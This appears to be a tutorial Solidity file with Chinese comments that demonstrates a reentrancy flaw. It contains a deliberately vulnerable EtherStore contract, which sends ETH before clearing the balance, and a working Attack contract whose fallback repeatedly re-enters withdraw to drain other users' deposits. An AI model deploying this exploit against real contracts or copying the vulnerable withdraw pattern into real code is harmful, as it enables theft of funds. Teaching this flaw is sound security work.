// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
EtherStore是一个合约，您可以存入和取出ETH。该合约容易受到可重入攻击的威胁。让我们来看看为什么。

1. 部署EtherStore
2. 从账户1（Alice）和账户2（Bob）各存入1个以太到EtherStore
3. 部署攻击合约并指定EtherStore的地址
4. 使用账户3（Eve）调用Attack.attack函数并发送1个以太。
   你将会得到3个以太（其中2个以太是从Alice和Bob那里被盗取的，另外1个以太是从这个合约发送的）。

发生了什么？
攻击者能够在EtherStore.withdraw执行完成之前多次调用EtherStore.withdraw。

以下是函数的调用方式：
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (收到 1 Ether)
- EtherStore.withdraw
- Attack.fallback (收到 1 Ether)
- EtherStore.withdraw
- Attack fallback (收到 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 当EtherStore向此合约发送以太时，将调用Fallback函数。
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // 辅助函数，用来检查此合同的余额
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
